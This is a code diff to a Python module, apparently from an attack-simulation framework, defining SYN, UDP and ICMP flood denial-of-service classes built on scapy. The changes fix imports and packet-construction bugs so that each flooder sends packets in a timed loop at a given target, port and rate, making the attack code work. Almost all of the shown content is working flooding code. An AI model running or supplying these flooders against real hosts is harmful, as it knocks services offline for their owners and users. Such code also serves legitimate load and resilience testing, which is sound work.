@@ -1,4 +1,3 @@
-from scapy.all import IP, TCP, send, RandShort
 import time
 from .attack_base import AttackBase
 from ..utils.logger import setup_logger
@@ -11,11 +10,12 @@ class DoSAttack(AttackBase):
     def __init__(self):
         super().__init__(
             name="SYN Flood DoS",
-            description="TCP SYN flood denial of service attack"
+            description="TCP SYN flood DoS (denial of service) attack"
         )
     
     def execute(self, target, duration=30, packet_rate=100, target_port=80):
         """Execute SYN flood attack"""
+        from scapy.all import IP, TCP, send, RandShort
         logger.info(f"Starting SYN flood: {target}:{target_port} for {duration}s")
         
         start_time = time.time()
@@ -55,7 +55,7 @@ class UDPFloodAttack(AttackBase):
     
     def execute(self, target, duration=30, packet_rate=100, target_port=53):
         """Execute UDP flood attack"""
-        from scapy.all import UDP
+        from scapy.all import IP, UDP, send, RandShort
         
         logger.info(f"Starting UDP flood: {target}:{target_port}")
         
@@ -66,7 +66,7 @@ class UDPFloodAttack(AttackBase):
             while time.time() - start_time < duration:
                 ip = IP(dst=target)
                 udp = UDP(sport=RandShort(), dport=target_port)
-                packet = ip/udp/"X"*1024  # 1KB payload
+                packet = ip/udp/("X"*1024)  # 1KB payload
                 
                 send(packet, verbose=0)
                 packets_sent += 1
@@ -91,7 +91,7 @@ class ICMPFloodAttack(AttackBase):
     
     def execute(self, target, duration=30, packet_rate=100):
         """Execute ICMP flood attack"""
-        from scapy.all import ICMP
+        from scapy.all import IP, ICMP, send
         
         logger.info(f"Starting ICMP flood: {target}")
         
@@ -102,7 +102,7 @@ class ICMPFloodAttack(AttackBase):
             while time.time() - start_time < duration:
                 ip = IP(dst=target)
                 icmp = ICMP()
-                packet = ip/icmp/"X"*56
+                packet = ip/icmp/("X"*56)
                 
                 send(packet, verbose=0)
                 packets_sent += 1
